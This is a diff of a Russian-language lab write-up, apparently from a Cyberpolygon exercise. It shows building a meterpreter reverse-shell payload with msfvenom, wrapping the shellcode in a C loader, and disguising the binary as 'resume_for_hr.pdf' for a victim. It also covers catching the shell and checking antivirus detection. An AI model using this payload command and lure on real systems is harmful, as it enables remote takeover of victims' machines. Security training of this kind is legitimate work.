@@ -66,29 +66,41 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c
 Затем мы вставим char buf[] в программу на C, которая будет действовать как оболочка для загрузки и запустит шеллкод.
 
 Скомпилировать след. командой файл hack.c
+
+
 ![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-40.png)
 
 
 Получен готовый вирус, который необходимо закинуть жертве. Попробуем переименовать его вместо hack.elf в resume_for_hr.pdf
 
 Настроим прослушиватель:
+
 ![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-52-50.png)
 
 Запустим:
+
 ![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-00.png)
 
+
 И получаем оболочку:
+
 ![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-08.png)
+
 
 ## Результаты сканирования антивирусных систем
 
 Анализ сканирования касперским нашего вредоносного файла hack.elf показал следующий результат :
+
 ![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-26.png)
 
+
 Анализ сканирования касперским нашего вредоносного файла resume.pdf показал следующий результат :
+
 ![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-35.png)
 
+
 Результат сканирования написанного вируса на virustotal :
+
 ![Screenshot](https://github.com/diurs/Cyberpolygon/blob/main/Screenshot%20from%202022-07-05%2018-53-55.png)
 
 
